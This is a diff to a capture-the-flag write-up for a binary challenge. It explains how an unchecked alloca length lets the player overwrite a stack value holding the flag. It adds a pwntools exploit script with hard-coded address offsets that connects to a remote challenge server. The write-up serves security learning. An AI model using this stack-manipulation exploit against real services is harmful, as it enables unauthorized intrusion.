@@ -223,4 +223,24 @@ void *__fastcall userinfo(void *a1)
 }
 ```
 
-`alloca` function is like `malloc`, but it use stack space. And don't you think that the name length limit of 0x100000000 is too long? If we input big number, It allocates the stack where `flag.txt` is stored. So we can modulate the value of that stack position. After `userinfo` end, it get user input and compare with the value of that stack position. We know what we need to input, right? If you want to offset(explained big num above)
+`alloca` function is like `malloc`, but it use stack space. And don't you think that the name length limit of 0x100000000 is too long? If we input big number, It allocates the stack where `flag.txt` is stored. So we can modulate the value of that stack position. After `userinfo` end, it get user input and compare with the value of that stack position. We know what we need to input, right? If you want to offset(big num described above), see exploit code.
+
+# exploit
+
+```python
+from pwn import *
+
+a = (0x7ffff7da6ec0 - 0x7ffff75a5db0 - 0x40)
+print(a)
+print(1000)
+
+#p = process('./terminal')
+p = remote('20.84.72.194', 5005)
+
+p.sendline(str(a).encode() + b'\n')
+p.sendline(b'1000\n')
+p.sendline(b'csh\n')
+p.sendline(b'a\n')
+p.sendline(b'csh\n')
+p.interactive()
+```
